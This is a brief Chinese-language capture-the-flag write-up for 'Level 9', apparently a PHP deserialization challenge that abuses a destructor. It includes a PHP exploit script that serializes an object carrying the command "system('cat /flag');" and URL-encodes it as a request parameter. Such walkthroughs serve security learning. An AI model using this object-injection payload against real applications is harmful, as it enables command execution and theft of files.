# WriteUP · Level 9


序列化和反序列化中的常规简单题目，这里考察的是一个析构函数漏洞的利用点，其实可以类比之前 实例化和反序列化，此外 本题为动态容器，flag位于根目录下 /flag EXP如下：

```PHP
<?php
class FLAG {
    var $flag_command = "system('cat /flag');";
}
$exp = "o=".urlencode(serialize(new FLAG()));
echo $exp;
```

要注意PHP语句要用`;`结尾。

